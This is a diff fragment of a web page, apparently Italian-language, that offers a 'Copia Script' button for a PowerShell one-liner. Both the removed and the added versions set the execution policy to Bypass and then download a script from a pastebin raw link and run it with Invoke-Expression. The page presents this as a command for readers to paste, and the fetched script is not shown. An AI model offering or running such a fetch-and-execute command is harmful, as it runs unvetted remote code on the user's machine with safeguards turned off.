@@ -763,7 +763,7 @@
           <button class="btn-copy-code" onclick="copyText('script-1', this)">
             Copia Script 📋
           </button>
-          <code id="script-1" class="code-block-dark">Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass; iex (iwr 'https://pastebin.com/raw/HGLwy7XA')</code>
+          <code id="script-1" class="code-block-dark">powershell Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass && powershell Invoke-Expression (Invoke-RestMethod https://pastebin.com/raw/HGLwy7XA)</code>
         </div>
 
         <div class="motivation">
